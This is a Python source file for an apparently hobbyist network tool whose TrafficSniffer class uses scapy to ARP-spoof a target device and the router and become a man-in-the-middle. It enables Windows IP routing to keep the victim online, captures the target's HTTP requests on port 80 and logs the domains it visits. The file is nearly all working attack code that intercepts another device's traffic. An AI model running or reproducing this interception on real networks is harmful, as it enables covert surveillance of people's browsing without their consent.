"""
Class used by the Device Traffic Window to sniff traffic
Target IP/MAC are the device we are monitoring
Host IP/MAC are the router the device would communicate with (we are impersonating)
"""
import scapy.all as scapy
from scapy.all import *
from scapy.layers.http import HTTPRequest
import threading
from WService import WService


class TrafficSniffer:
    # Constructor
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.domains = []  # Used to track the domains the device has visited whilst being sniffed.
        self.enable_windows_iproute()  # Enables packet routing, to keep device online

    # Enable IP Routing on the device - allows Target device to stay online
    def enable_windows_iproute(self):
        service = WService("RemoteAccess")
        service.start()

    # The function to be ran on a button press, used to return the list of domains the device has visited
    def sniffing_function(self, target_ip, target_mac, host_ip):
        # The two threads will be ran simultaneously
        t1 = threading.Thread(target=self.spoof, args=[target_ip, target_mac, host_ip])  # Sends ARP spoofing packets
        t2 = threading.Thread(target=self.sniff_packets)  # Sniffs incoming traffic
        t1.start()
        t2.start()
        t1.join()
        t2.join()
        return self.domains

    # Send ARP spoofing packets to the Target device so it believes our device is the host (router)
    def spoof(self, target_ip, target_mac, host_ip):
        # Create ARP packet
        arp_response = scapy.all.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
        # Send the packet
        scapy.all.send(arp_response, verbose=0)

    # Sniff packets coming through our device on Port 80, timeout if there is no traffic after 20 seconds
    def sniff_packets(self):
        sniff(filter="port 80", prn=self.process_packet, store=False, timeout=20)
        # If a packet comes in, "process_packet" is ran against it

    # Callback function ran every time a packet is "sniffed" by the function above
    def process_packet(self, packet):
        if packet.haslayer(HTTPRequest):  # Check if the packet has a HTTPRequest
            full_url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            req_device = packet['IP'].src  # This is the device that made the packet request
            if req_device == self.target_ip:  # Filtering out our own devices' traffic to focus on target device
                domain = full_url.split('/')[0]  # Retrieves the domain, avoiding repetition of different site pages
                if domain not in self.domains:
                    self.domains.append(domain)

    # Sending the ARP spoof packets AND read packets sent from target at the same time
    def spoof_loop(self, target_ip, target_mac, host_ip, host_mac):
        # Continually send an ARP packet saying that we are the router (.1)
        while True:
            self.spoof(target_ip, target_mac, host_ip)  # Makes the target device believe we are the router
            self.spoof(host_ip, host_mac, target_ip)  # Makes the router believe we are the target device

